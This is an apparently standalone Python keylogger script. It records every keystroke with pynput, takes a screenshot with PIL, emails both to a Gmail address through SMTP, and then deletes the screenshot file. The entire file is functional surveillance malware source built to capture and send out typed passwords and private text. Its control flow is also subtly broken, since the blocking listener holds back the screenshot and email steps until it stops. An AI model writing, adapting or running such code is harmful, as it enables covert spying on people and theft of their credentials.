import pynput.keyboard
import smtplib
import os
import platform
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from pynput import keyboard
from PIL import ImageGrab

# Prompt the user for the email address and password
email_address = input("Enter the email address to send the logs to: ")
email_password = input("Enter the password for the email address: ")

# Create a variable to store the keystrokes
keylogs = ""

# Create a function to handle the keystrokes
def on_press(key):
    global keylogs
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    keylogs += current_key

# Create a keyboard listener
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
with keyboard_listener:
    keyboard_listener.join()

# Create a function to take screenshots
def take_screenshot():
    screenshot = ImageGrab.grab()
    filename = "screenshot_" + str(int(time.time())) + ".png"
    screenshot.save(filename)
    return filename

# Create a function to send the email
def send_email(email_address, email_password, keylogs, screenshot):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = "Keylogger Data"
    msg.attach(MIMEText(keylogs))
    with open(screenshot, 'rb') as f:
        img_data = f.read()
    image = MIMEImage(img_data, name="screenshot.png")
    msg.attach(image)

    # Send the email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_address, email_password)
    server.sendmail(email_address, email_address, msg.as_string())
    server.quit()

# Take a screenshot and send the email
screenshot = take_screenshot()
send_email(email_address, email_password, keylogs, screenshot)

# Delete the screenshot and keylogs file after sending it
os.remove(screenshot)
